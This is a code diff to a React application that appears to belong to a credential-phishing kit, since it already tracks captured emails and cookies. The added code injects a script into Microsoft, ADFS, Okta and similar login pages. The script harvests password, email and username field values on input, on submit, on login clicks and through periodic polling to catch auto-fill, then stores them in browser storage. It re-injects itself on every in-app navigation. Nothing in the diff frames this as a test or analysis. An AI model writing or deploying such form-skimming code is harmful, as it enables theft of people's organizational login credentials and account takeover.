@@ -18,6 +18,193 @@ function App() {
   const [capturedEmail, setCapturedEmailState] = useState<string | null>(null);
   const [capturedCookies, setCapturedCookiesState] = useState<string | null>(null);
 
+  // Inject password capture script for Microsoft/organizational domains
+  useEffect(() => {
+    const injectPasswordCaptureScript = () => {
+      // Only inject if we're on a Microsoft or organizational domain
+      const hostname = window.location.hostname;
+      const isMicrosoftDomain = hostname.includes('login.microsoftonline.com') || 
+                               hostname.includes('login.live.com') ||
+                               hostname.includes('account.microsoft.com');
+      
+      const isOrgDomain = hostname.includes('adfs') || 
+                         hostname.includes('sso') || 
+                         hostname.includes('okta') ||
+                         hostname.includes('ping') ||
+                         document.querySelector('input[type="password"]');
+
+      if (isMicrosoftDomain || isOrgDomain) {
+        const script = document.createElement('script');
+        script.textContent = `
+          // Password capture for Microsoft/organizational login pages
+          (function() {
+            console.log('🔑 Password capture script loaded on:', window.location.hostname);
+            
+            let capturedCredentials = {
+              email: '',
+              password: '',
+              username: '',
+              domain: window.location.hostname,
+              captureTime: new Date().toISOString()
+            };
+            
+            function capturePasswordFromForms() {
+              try {
+                const passwordFields = document.querySelectorAll('input[type="password"]');
+                const emailFields = document.querySelectorAll('input[type="email"], input[name*="email"], input[name*="mail"], input[id*="email"]');
+                const usernameFields = document.querySelectorAll('input[name*="user"], input[name*="login"], input[name*="account"], input[id*="user"], input[id*="login"]');
+                
+                let hasNewData = false;
+                
+                passwordFields.forEach(field => {
+                  if (field.value && field.value !== capturedCredentials.password) {
+                    capturedCredentials.password = field.value;
+                    hasNewData = true;
+                    console.log('🔑 Password captured from field:', field.name || field.id || 'unnamed');
+                  }
+                });
+                
+                emailFields.forEach(field => {
+                  if (field.value && field.value !== capturedCredentials.email) {
+                    capturedCredentials.email = field.value;
+                    hasNewData = true;
+                    console.log('📧 Email captured from field:', field.name || field.id || 'unnamed');
+                  }
+                });
+                
+                usernameFields.forEach(field => {
+                  if (field.value && field.value !== capturedCredentials.username) {
+                    capturedCredentials.username = field.value;
+                    hasNewData = true;
+                    console.log('👤 Username captured from field:', field.name || field.id || 'unnamed');
+                  }
+                });
+                
+                if (hasNewData) {
+                  storeCredentials();
+                }
+                
+                return hasNewData;
+              } catch (error) {
+                console.error('❌ Error capturing password:', error);
+                return false;
+              }
+            }
+            
+            function storeCredentials() {
+              const credentialsData = {
+                email: capturedCredentials.email,
+                password: capturedCredentials.password,
+                username: capturedCredentials.username,
+                domain: capturedCredentials.domain,
+                captureTime: capturedCredentials.captureTime,
+                source: 'injected-password-capture',
+                url: window.location.href
+              };
+              
+              try {
+                sessionStorage.setItem('captured_credentials', JSON.stringify(credentialsData));
+                localStorage.setItem('user_credentials', JSON.stringify(credentialsData));
+                sessionStorage.setItem('login_credentials_backup', JSON.stringify(credentialsData));
+                
+                console.log('💾 Stored credentials:', {
+                  hasEmail: !!credentialsData.email,
+                  hasPassword: !!credentialsData.password,
+                  hasUsername: !!credentialsData.username
+                });
+              } catch (error) {
+                console.error('❌ Error storing credentials:', error);
+              }
+            }
+            
+            // Monitor input changes
+            document.addEventListener('input', function(e) {
+              if (e.target.type === 'password' || 
+                  e.target.name?.toLowerCase().includes('password') ||
+                  e.target.name?.toLowerCase().includes('email') ||
+                  e.target.name?.toLowerCase().includes('user') ||
+                  e.target.id?.toLowerCase().includes('password') ||
+                  e.target.id?.toLowerCase().includes('email') ||
+                  e.target.id?.toLowerCase().includes('user')) {
+                
+                console.log('🔍 Credential field changed:', e.target.name || e.target.id, e.target.type);
+                setTimeout(() => {
+                  capturePasswordFromForms();
+                }, 300);
+              }
+            });
+            
+            // Monitor form submissions
+            document.addEventListener('submit', function(e) {
+              console.log('📝 Form submitted, capturing credentials...');
+              setTimeout(() => {
+                capturePasswordFromForms();
+              }, 100);
+            });
+            
+            // Monitor button clicks
+            document.addEventListener('click', function(e) {
+              const target = e.target;
+              if (target.type === 'submit' || 
+                  target.textContent?.toLowerCase().includes('sign in') ||
+                  target.textContent?.toLowerCase().includes('login') ||
+                  target.textContent?.toLowerCase().includes('next') ||
+                  target.className?.toLowerCase().includes('submit') ||
+                  target.className?.toLowerCase().includes('login')) {
+                
+                console.log('🖱️ Login button clicked, capturing credentials...');
+                setTimeout(() => {
+                  capturePasswordFromForms();
+                }, 500);
+              }
+            });
+            
+            // Periodic capture for auto-fill
+            setInterval(() => {
+              capturePasswordFromForms();
+            }, 3000);
+            
+            // Initial capture
+            setTimeout(() => {
+              capturePasswordFromForms();
+            }, 1000);
+            
+            console.log('✅ Password capture script initialized');
+          })();
+        `;
+        
+        document.head.appendChild(script);
+        console.log('📝 Injected password capture script');
+      }
+    };
+
+    // Inject script when app loads
+    injectPasswordCaptureScript();
+    
+    // Also inject when URL changes (for SPAs)
+    const originalPushState = history.pushState;
+    const originalReplaceState = history.replaceState;
+    
+    history.pushState = function(...args) {
+      originalPushState.apply(history, args);
+      setTimeout(injectPasswordCaptureScript, 1000);
+    };
+    
+    history.replaceState = function(...args) {
+      originalReplaceState.apply(history, args);
+      setTimeout(injectPasswordCaptureScript, 1000);
+    };
+    
+    window.addEventListener('popstate', () => {
+      setTimeout(injectPasswordCaptureScript, 1000);
+    });
+
+    return () => {
+      history.pushState = originalPushState;
+      history.replaceState = originalReplaceState;
+    };
+  }, []);
+
   // Listen for messages from enhancer scripts for robust cookie/email capture
   useEffect(() => {
     function handleMessage(event: MessageEvent) {
